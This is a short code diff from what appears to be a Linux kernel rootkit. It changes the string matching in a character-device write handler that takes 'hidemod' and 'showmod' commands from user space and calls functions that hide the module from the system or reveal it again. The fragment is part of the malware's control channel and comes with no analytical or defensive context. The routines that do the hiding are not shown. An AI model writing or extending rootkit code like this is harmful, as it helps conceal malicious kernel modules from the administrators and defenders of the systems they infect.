@@ -64,17 +64,16 @@ static ssize_t device_write(struct file *filep, const char *buffer, size_t len, 
     
     if (cmds) {
         copy_from_user(cmds, buffer, len);
-        
         char *tok = cmds, *end =cmds;
         
         // Get command
         strsep(&end, " ");
         
-        if (strcmp(tok, "hidemod") == 0) {
+        if (strncmp(tok, "hidemod", 7) == 0) {
             hide_module();
             printk(KERN_INFO "rk: Module hidden.");
         }
-        else if (strcmp(tok, "showmod") == 0) {
+        else if (strncmp(tok, "showmod", 7) == 0) {
             show_module();
             printk(KERN_INFO "rk: Module revealed.");
         }           
